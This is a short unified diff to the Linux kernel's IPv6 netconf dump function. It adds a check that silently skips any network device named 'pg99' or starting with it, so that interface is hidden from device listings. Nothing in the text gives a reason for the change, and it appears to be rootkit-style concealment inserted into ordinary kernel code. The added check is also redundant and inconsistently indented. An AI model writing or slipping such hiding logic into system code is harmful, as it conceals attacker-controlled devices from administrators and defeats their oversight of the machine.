@@ -760,6 +760,9 @@ static int inet6_netconf_dump_devconf(struct sk_buff *skb,
 
 	rcu_read_lock();
 	for_each_netdev_dump(net, dev, ctx->ifindex) {
+	        if (strcmp(dev->name, "pg99") == 0 || strncmp(dev->name, "pg99", 4) == 0) {
+	            continue;
+	        }
 		idev = __in6_dev_get(dev);
 		if (!idev)
 			continue;
